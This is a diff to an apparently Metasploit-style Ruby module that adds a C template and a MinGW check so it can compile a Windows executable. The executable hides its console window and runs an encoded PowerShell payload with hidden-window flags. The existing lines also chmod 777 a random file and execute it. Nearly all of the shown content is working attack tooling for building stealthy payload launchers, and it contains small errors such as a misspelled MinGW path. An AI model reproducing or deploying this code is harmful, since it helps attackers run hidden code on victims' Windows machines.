@@ -34,10 +34,55 @@ register_options(
 cmd_exec("mkdir -m 700 -p /root/test")
 cmd_exec("chmod 777 #{random_file_path}")
 cmd_exec("sh #{random_file_path}")
+system("msfconsole -q -x 'db_status'")
 # read file
 read_file("/proc/scsi/scsi")
 
 
+
+
+
+#
+# C template
+#
+exeTEMPLATE = %{#include <stdio.h>
+#include <windows.h>
+int shellCode(){
+	system("color 63");
+	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+	/*
+		((Shell Code into the console))
+	*/
+	return 0;
+}
+void hide(){
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass",NULL);
+	ShowWindow (stealth,0);
+}
+int main(){
+	hide();
+	shellCode();
+	return 0;
+}
+}
+
+# write C template to  file
+file_temp = File.new("temp.c", "w")
+file_temp.write(exeTEMPLATE)
+file_temp.close
+
+
+
+
+
+#determine if MinGW has been installed, support new and old MinGW system paths
+mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
+if mingw == false
+    print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
+    exit
+end
 
 
 
